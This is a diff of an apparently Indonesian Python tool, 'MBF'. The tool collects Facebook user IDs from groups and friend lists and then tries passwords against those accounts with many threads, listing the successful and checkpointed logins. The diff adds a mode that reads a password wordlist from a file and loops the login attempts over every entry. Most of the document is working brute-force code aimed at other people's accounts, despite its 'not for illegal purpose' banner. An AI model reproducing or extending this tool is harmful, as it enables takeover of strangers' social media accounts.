@@ -36,10 +36,10 @@ br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U;
 def bacaData():
 	global fid_bgroup,fid_bteman
 	try:
-		fid_bgroup = open(os.sys.path[0]+'/.MBFbgroup.id','r').readlines()
+		fid_bgroup = open(os.sys.path[0]+'/MBFbgroup.txt','r').readlines()
 	except:pass
 	try:
-		fid_bteman = open(os.sys.path[0]+'/.MBFbteman.id','r').readlines()
+		fid_bteman = open(os.sys.path[0]+'/MBFbteman.txt','r').readlines()
 	except:pass
 def inputD(x,v=0):
 	while 1:
@@ -77,15 +77,15 @@ def simpan():
 	if len(id_bgroup) != 0:
 		tampil('\rh[*]Menyimpan hasil dari group')
 		try:
-			open(os.sys.path[0]+'/.MBFbgroup.id','w').write('\n'.join(id_bgroup))
-			tampil('\rh[!]Berhasil meyimpan \rcMBFbgroup.id')
+			open(os.sys.path[0]+'/MBFbgroup.txt','w').write('\n'.join(id_bgroup))
+			tampil('\rh[!]Berhasil meyimpan \rcMBFbgroup.txt')
 		except:
 			tampil('\rm[!]Gagal meyimpan')
 	if len(id_bteman) != 0:
 		tampil('\rh[*]Menyimpan hasil daftar Teman...')
 		try:
-			open(os.sys.path[0]+'/.MBFbteman.id','w').write('\n'.join(id_bteman))
-			tampil('\rh[!]Berhasil meyimpan \rcMBFbgteman.id')
+			open(os.sys.path[0]+'/MBFbteman.txt','w').write('\n'.join(id_bteman))
+			tampil('\rh[!]Berhasil meyimpan \rcMBFbgteman.txt')
 		except:
 			tampil('\rm[!]Gagal meyimpan')
 def buka(d):
@@ -223,9 +223,31 @@ class mt(threading.Thread):
             self.a = 2
         else:
             self.a = 0
-def crack(data):
-	sandi = inputD('[?]Sandi')
-	tampil('\rh[*]MengCrack \rk%d Akun \rhdengan sandi \rk%s'%(len(data),sandi))
+def crack(d):
+	i = inputD('[?]Pake Passwordlist/Manual (p/m)',['P','M'])
+	if i.upper() == 'P':
+		while 1:
+			dir = inputD('[?]Masukan alamat file')
+			try:
+				D = open(dir,'r').readlines()
+			except:
+				tampil('\rm[!]Gagal membuka \rk%s'%dir)
+				continue
+			break
+		tampil('\rh[*]Memulai crack dengan \rk%d password'%len(D))
+		for i in D:
+			i = i.replace('\n','')
+			if len(i) != 0:
+				crack0(d,i,0)
+		i = inputD('[?]Tidak Puas dengan Hasil,Mau coba lagi (y/t)',['Y','T'])
+		if i.upper() == 'Y':
+			return crack(d)
+		else:
+			return menu()
+	else:
+		return crack0(d,inputD('[?]Sandi'),1)
+def crack0(data,sandi,p):
+	tampil('\rh[*]MengCrack \rk%d Akun \rhdengan sandi \rm[\rk%s\rm]'%(len(data),sandi))
 	print('\033[32;1m[*]Cracking \033[31;1m[\033[36;1m0%\033[31;1m]\033[0m',end='')
 	os.sys.stdout.flush()
 	akun_jml = []
@@ -262,22 +284,27 @@ def crack(data):
 					akun_jml.append(a[1])
 		except KeyboardInterrupt:
 			os.sys.exit()
-		if threading.activeCount() == 1:break
+		try:
+			if threading.activeCount() == 1:break
+		except KeyboardInterrupt:
+			keluar()
 	print('\r\033[32;1m[*]Cracking \033[31;1m[\033[36;1m100%\033[31;1m]\033[0m     ')
-	tampil('\rh[*]Menampilkan Hasil....')
 	if len(akun_sukses) != 0:
 		tampil('\rh[*]Daftar akun sukses')
 		for i in akun_sukses:
-			tampil('\rh==>\rk%s'%i)
-	tampil('\rh[*]Jumlah akun berhasil=\rp %d'%len(akun_sukses))
-	tampil('\rm[*]Jumlah akun gagal=\rp %d'%len(akun_gagal))
-	tampil('\rk[*]Jumlah akun berhasil tapi checkpoint=\rp %d'%len(akun_cekpoint))
-	tampil('\rc[*]Jumlah akun gagal menyambung/error=\rp %d'%len(akun_error))
-	i = inputD('[?]Tidak Puas dengan Hasil,Mau coba lagi (y/t)',['Y','T'])
-	if i.upper() == 'Y':
-		return crack(data)
+			tampil('\rh==>\rk%s \rm[\rp%s\rm]'%(i,sandi))
+	tampil('\rh[*]Jumlah akun berhasil\rp      %d'%len(akun_sukses))
+	tampil('\rm[*]Jumlah akun gagal\rp         %d'%len(akun_gagal))
+	tampil('\rk[*]Jumlah akun cekpoint\rp      %d'%len(akun_cekpoint))
+	tampil('\rc[*]Jumlah akun error\rp         %d'%len(akun_error))
+	if p:
+		i = inputD('[?]Tidak Puas dengan Hasil,Mau coba lagi (y/t)',['Y','T'])
+		if i.upper() == 'Y':
+			return crack(data)
+		else:
+			return menu()
 	else:
-		return menu()
+		return 0
 def lanjutT():
 	global fid_bteman
 	if len(fid_bteman) != 0:
@@ -285,7 +312,7 @@ def lanjutT():
 		if i.upper() == 'L':
 			return crack(fid_bteman)
 		else:
-			os.remove(os.sys.path[0]+'/.MBFbteman.id')
+			os.remove(os.sys.path[0]+'/MBFbteman.txt')
 			fid_bteman = []
 	return 0
 def lanjutG():
@@ -295,7 +322,7 @@ def lanjutG():
 		if i.upper() == 'L':
 			return crack(fid_bgroup)
 		else:
-			os.remove(os.sys.path[0]+'/.MBFbgroup.id')
+			os.remove(os.sys.path[0]+'/MBFbgroup.txt')
 			fid_bgroup = []
 	return 0
 def menu():
@@ -316,7 +343,7 @@ def menu():
 # \rhGitHub\rp                      https://github.com/pirmansx \rk#
 #       \rmDo Not Use This Tool For IllegaL Purpose          \rk#
 ###########################################################''')
-	tampil('''\rk%s\n\rc1 \rhAmbil id dari group\n\rc2 \rhAmbil id dari daftar teman\n\rc3 \rmKELUAR\n\rk%s'''%('#'*15,'#'*15))
+	tampil('''\rk%s\n\rc1 \rhAmbil id dari group\n\rc2 \rhAmbil id dari daftar teman\n\rc3 \rmKELUAR\n\rk%s'''%('#'*20,'#'*20))
 	i = inputM('[?]PILIH',[1,2,3])
 	if i == 1:
 		lanjutG()
